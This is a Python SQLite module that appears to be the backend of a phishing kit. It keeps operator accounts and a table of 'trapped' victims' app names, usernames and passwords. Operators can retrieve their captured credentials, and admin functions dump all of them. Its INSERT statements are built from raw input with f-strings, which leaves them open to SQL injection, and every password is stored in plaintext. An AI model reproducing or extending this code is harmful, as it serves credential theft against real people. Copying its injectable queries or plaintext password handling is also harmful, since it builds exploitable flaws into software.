import sqlite3
conn=None

def ConnectionToTrapedDB():
    global conn
    conn=sqlite3.connect('TrappedData.db',check_same_thread=False)
    conn.execute('''CREATE TABLE IF NOT EXISTS TRAPED
            (OWNER TEXT     NOT NULL,
            APP    TEXT NOT NULL,
            UID  TEXT NOT NULL,
            PASSWORD    TEXT    NOT NULL);
            ''')
    
    conn.commit()
    print("Made  Connection to Traped Database")
    return conn

def ConnectionToUserDB():
    global conn
    conn=sqlite3.connect('UserData.db',check_same_thread=False)
    conn.execute('''CREATE TABLE IF NOT EXISTS USERS
            (UID  TEXT PRIMARY KEY NOT NULL,
            EMAIL TEXT NOT NULL,
            PASSWORD    TEXT    NOT NULL);
            ''')
    conn.commit()
    print("Made Connection to Users Database")
    return conn



# used while registering and checking for generated phishing url
def checkIfUserExists(uid):
    conn=ConnectionToUserDB()
    if len(conn.execute("select UID from USERS where UID=?", (uid,)).fetchall())==0:
        conn.close()
        return False
    conn.close()
    return True



#used while registering
def insertIntoUser(uid,email,pas):
    conn=ConnectionToUserDB()
    conn.execute(f"INSERT INTO USERS (UID,EMAIL,PASSWORD) \
      VALUES ('{uid}','{email}','{pas}' )")
    conn.commit()
    print("user added")
    conn.close()



#used while logginig
def checkUserCredential(uid,pas):
    for row in ConnectionToUserDB().execute(f"SELECT UID,PASSWORD from USERS where UID=?",(uid,)):
        if row[0]==uid and row[1]==pas:
            return True
        return False




#used to insert into traped data
def insertIntoTraped(owner,site,uid,pas):
    conn=ConnectionToTrapedDB()
    conn.execute(f"INSERT INTO TRAPED (OWNER,APP,UID,PASSWORD) \
      VALUES ('{owner}','{site}','{uid}','{pas}' )")
    conn.commit()
    print("user traped")
    conn.close()



#get the traped data for user
def getTrapedDataForOwner(uid):
    cursor = ConnectionToTrapedDB().execute("SELECT OWNER,APP,UID,PASSWORD from TRAPED where OWNER=?",(uid,))
    n=ConnectionToTrapedDB().execute("select count(*) from TRAPED where OWNER=?",(uid,)).fetchall()[-1][-1]
    return [cursor,n]




#------------------------------------------------ADMIN-----------------------------------------

#for admin
def getTrapedData():
    cursor = ConnectionToTrapedDB().execute("SELECT OWNER,APP,UID,PASSWORD from TRAPED")
    n=ConnectionToTrapedDB().execute("select count(*) from TRAPED").fetchall()[-1][-1]
    return [cursor,n]


 #for admin      
def getUserData():
    cursor = ConnectionToUserDB().execute("SELECT UID,EMAIL,PASSWORD from USERS")
    n=ConnectionToUserDB().execute("select count(*) from USERS").fetchall()[-1][-1]
    return [cursor,n]
    

#for admin
def saveFeedback(uid,name,email,msg):
    conn=sqlite3.connect('Message.db',check_same_thread=False)
    conn.execute('''CREATE TABLE IF NOT EXISTS MESSAGE
            (UID  TEXT  NOT NULL,
            NAME TEXT NOT NULL,
            EMAIL TEXT NOT NULL,
            MSG    TEXT    NOT NULL);
            ''')
    conn.execute(f"INSERT INTO MESSAGE (UID,NAME,EMAIL,MSG) \
      VALUES ('{uid}','{name}','{email}','{msg}' )")
    conn.commit()
    conn.close()


#for admin
def getFeedbackData():
    conn=sqlite3.connect('Message.db',check_same_thread=False)
    conn.execute('''CREATE TABLE IF NOT EXISTS MESSAGE
            (UID  TEXT  NOT NULL,
            NAME TEXT NOT NULL,
            EMAIL TEXT NOT NULL,
            MSG    TEXT    NOT NULL);
            ''')
    cursor = conn.execute("SELECT UID,NAME,EMAIL,MSG from MESSAGE")
    n=conn.execute("select count(*) from MESSAGE").fetchall()[-1][-1]
    return [cursor,n]






#for admin
def deleteAll():
    ConnectionToTrapedDB().execute("drop table TRAPED")
    conn.close()
    ConnectionToUserDB().execute("drop table USERS")
    conn.close()
    print("data deleted")
